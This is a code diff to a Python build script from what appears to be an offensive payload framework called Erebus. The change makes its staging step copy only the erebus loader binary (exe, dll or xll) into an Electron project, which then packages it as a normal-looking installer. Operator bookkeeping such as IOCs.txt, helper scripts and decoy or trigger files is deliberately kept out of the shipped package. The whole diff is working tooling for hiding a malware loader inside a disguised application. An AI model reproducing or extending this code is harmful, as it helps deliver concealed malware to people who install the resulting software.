@@ -330,23 +330,48 @@ def _apply_pe_metadata(
 
 def _stage_payload(project_dir: pathlib.Path, payload_dir: pathlib.Path) -> None:
     """
-    Copy the entire payload/ tree into the Electron project's
-    build/resources/payload directory where electron-builder's
-    extraResources directive will pick it up.
+    Stage **only** the single ``erebus.*`` loader binary into the Electron
+    project's ``build/resources/payload/`` directory for electron-builder's
+    extraResources directive.
+
+    This is an allowlist, not a blocklist: every other file and every
+    subdirectory in ``payload/`` is deliberately dropped, including:
+
+    - Operator bookkeeping (``IOCs.txt``, ``erebus_helper.py``, ``build_*.bat``,
+      ``*.readme.txt``, ``*.bas``, ``electron_src/``, …)
+    - Trigger-only sidecars (``clickonce_trigger/``, decoy files, generated
+      trigger artefacts from parallel ``0.9 Trigger Type`` selections)
+    - ClickOnce publish satellite DLLs (the ClickOnce loader is typically
+      self-contained single-file when publish flags are set; satellite DLLs
+      that are required would make ClickOnce+Electron a non-viable combo)
+
+    Any of the three loader output shapes (``erebus.exe``, ``erebus.dll``,
+    ``erebus.xll``) is accepted — exactly one exists in ``payload/`` after a
+    given build, matching the ``3.E4 Electron Entry Format`` the wizard
+    spawns at install time.
     """
     resources_target = project_dir / "build" / "resources" / "payload"
     if resources_target.exists():
         shutil.rmtree(resources_target)
     resources_target.mkdir(parents=True, exist_ok=True)
+
+    # Explicit allowlist: only files matching erebus.{exe,dll,xll} at the
+    # top level of payload/ are staged. Subdirectories are never copied.
+    allowed_loader_names = {"erebus.exe", "erebus.dll", "erebus.xll"}
+    staged_any = False
     for item in payload_dir.iterdir():
-        if item.is_dir():
-            shutil.copytree(
-                str(item),
-                str(resources_target / item.name),
-                ignore=shutil.ignore_patterns("electron_src"),
-            )
-        elif item.is_file() and item.name != "build_electron.bat" and not item.name.startswith("electron_"):
+        if not item.is_file():
+            continue
+        if item.name in allowed_loader_names:
             shutil.copy2(str(item), str(resources_target / item.name))
+            staged_any = True
+
+    if not staged_any:
+        raise FileNotFoundError(
+            f"No erebus.{{exe,dll,xll}} loader binary found in {payload_dir}. "
+            "The Electron container requires a Loader build (0.0 Main Payload Type = Loader) "
+            "with a completed loader compilation step before containerisation runs."
+        )
 
 
 def _find_nsis_output(dist_dir: pathlib.Path) -> Optional[pathlib.Path]:
